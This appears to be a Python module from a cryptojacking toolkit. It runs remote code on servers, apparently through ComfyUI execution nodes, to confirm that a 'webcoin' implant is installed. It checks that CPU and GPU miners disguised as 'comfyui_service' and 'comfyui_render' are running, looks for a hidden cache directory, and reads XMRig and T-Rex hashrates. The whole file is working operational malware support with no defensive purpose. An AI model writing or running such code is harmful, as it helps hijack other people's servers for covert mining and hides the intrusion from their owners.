"""
Post-install verification — checks that webcoin is properly installed,
miners are running, and infrastructure is healthy.
"""

from __future__ import annotations
from dataclasses import dataclass
from typing import Callable

from . import executor
from .discovery import ServerProfile

LOG_CB = Callable[[str], None]

VERIFY_CODE = r'''import os, subprocess, json

lines = []

# 1. webcoin files
cn = "{cn_path}" if "{cn_path}" else ""
if not cn:
    for base in ["/root", "/app", "/home", "/opt", "/workspace"]:
        if not os.path.isdir(base):
            continue
        for root, dirs, files in os.walk(base):
            if "custom_nodes" in dirs:
                cn = os.path.join(root, "custom_nodes")
                break
        if cn:
            break

wc = os.path.join(cn, "webcoin") if cn else ""
lines.append(f"cn_path={cn}")
lines.append(f"init_py={os.path.isfile(os.path.join(wc, '__init__.py')) if wc else False}")
lines.append(f"resilience={os.path.isfile(os.path.join(wc, 'core', 'resilience.py')) if wc else False}")
lines.append(f"cache_dir_mod={os.path.isfile(os.path.join(wc, 'core', 'cache_dir.py')) if wc else False}")
lines.append(f"job_throttle={os.path.isfile(os.path.join(wc, 'core', 'job_throttle.py')) if wc else False}")

if wc and os.path.isdir(wc):
    r = subprocess.run(["git", "-C", wc, "log", "--oneline", "-1"],
                       capture_output=True, text=True, timeout=10)
    lines.append(f"commit={r.stdout.strip()}")

# 2. Miner processes
r2 = subprocess.run(["ps", "aux"], capture_output=True, text=True, timeout=10)
cpu_miner = any("comfyui_service" in l for l in r2.stdout.splitlines())
gpu_miner = any("comfyui_render" in l for l in r2.stdout.splitlines())
lines.append(f"cpu_miner_running={cpu_miner}")
lines.append(f"gpu_miner_running={gpu_miner}")

# 3. Hidden cache
uid = os.getuid() if hasattr(os, "getuid") else 1000
cache = "/var/tmp/.comfyui_cache" if uid == 0 else os.path.expanduser("~/.local/share/.comfyui_cache")
cache_exists = os.path.isdir(cache)
lines.append(f"cache_dir={cache}")
lines.append(f"cache_exists={cache_exists}")
if cache_exists:
    lines.append(f"cache_contents={os.listdir(cache)}")

# 4. GPU
try:
    r3 = subprocess.run(["nvidia-smi", "--query-gpu=name,temperature.gpu,utilization.gpu,memory.used,memory.total",
                          "--format=csv,noheader"], capture_output=True, text=True, timeout=10)
    lines.append(f"gpu={r3.stdout.strip()}" if r3.returncode == 0 else "gpu=none")
except Exception:
    lines.append("gpu=none")

# 5. XMRig API
try:
    import urllib.request as ur
    rr = ur.urlopen("http://127.0.0.1:44880/2/summary", timeout=3)
    d = json.loads(rr.read())
    hr = d.get("hashrate", {}).get("total", [0])[0]
    lines.append(f"xmrig_hr={hr}")
except Exception:
    lines.append("xmrig_hr=0")

# 6. T-Rex API
try:
    import urllib.request as ur2
    rr2 = ur2.urlopen("http://127.0.0.1:4067/summary", timeout=3)
    d2 = json.loads(rr2.read())
    gpu_hr = d2.get("hashrate", 0)
    lines.append(f"trex_hr={gpu_hr}")
except Exception:
    lines.append("trex_hr=0")

return "\n".join(lines)
'''


@dataclass
class VerifyResult:
    webcoin_installed: bool = False
    has_resilience: bool = False
    has_cache_dir_mod: bool = False
    has_job_throttle: bool = False
    commit: str = ""
    cpu_miner_running: bool = False
    gpu_miner_running: bool = False
    cache_exists: bool = False
    gpu_detected: str = ""
    xmrig_hashrate: float = 0.0
    trex_hashrate: float = 0.0
    raw: str = ""

    @property
    def all_good(self) -> bool:
        return self.webcoin_installed and self.has_resilience and self.cpu_miner_running


def _log(cb: LOG_CB | None, msg: str):
    if cb:
        cb(msg)


def verify(profile: ServerProfile, log: LOG_CB | None = None) -> VerifyResult:
    """Run full verification on a server. Returns structured result."""
    result = VerifyResult()

    if not profile.reachable or not profile.all_exec_nodes:
        _log(log, "Cannot verify — server unreachable or no exec nodes")
        return result

    cn = profile.custom_nodes_path or ""
    code = VERIFY_CODE.replace("{cn_path}", cn)
    _log(log, f"Running verification on {profile.ip} ...")
    raw = executor.execute(profile, code, log=log)

    if not raw:
        _log(log, "  No output from verification script")
        return result

    result.raw = raw
    vals: dict[str, str] = {}
    for line in raw.strip().splitlines():
        if "=" in line:
            k, _, v = line.partition("=")
            vals[k.strip()] = v.strip()

    result.webcoin_installed = vals.get("init_py") == "True"
    result.has_resilience = vals.get("resilience") == "True"
    result.has_cache_dir_mod = vals.get("cache_dir_mod") == "True"
    result.has_job_throttle = vals.get("job_throttle") == "True"
    result.commit = vals.get("commit", "")
    result.cpu_miner_running = vals.get("cpu_miner_running") == "True"
    result.gpu_miner_running = vals.get("gpu_miner_running") == "True"
    result.cache_exists = vals.get("cache_exists") == "True"
    result.gpu_detected = vals.get("gpu", "none")

    try:
        result.xmrig_hashrate = float(vals.get("xmrig_hr", "0"))
    except ValueError:
        pass
    try:
        result.trex_hashrate = float(vals.get("trex_hr", "0"))
    except ValueError:
        pass

    if not profile.custom_nodes_path:
        profile.custom_nodes_path = vals.get("cn_path", "")

    _log(log, f"  Installed: {result.webcoin_installed} | Resilience: {result.has_resilience}")
    _log(log, f"  CPU miner: {result.cpu_miner_running} | GPU miner: {result.gpu_miner_running}")
    _log(log, f"  Commit: {result.commit}")
    _log(log, f"  Cache: {result.cache_exists} | GPU: {result.gpu_detected}")
    _log(log, f"  XMRig HR: {result.xmrig_hashrate} | T-Rex HR: {result.trex_hashrate}")

    return result
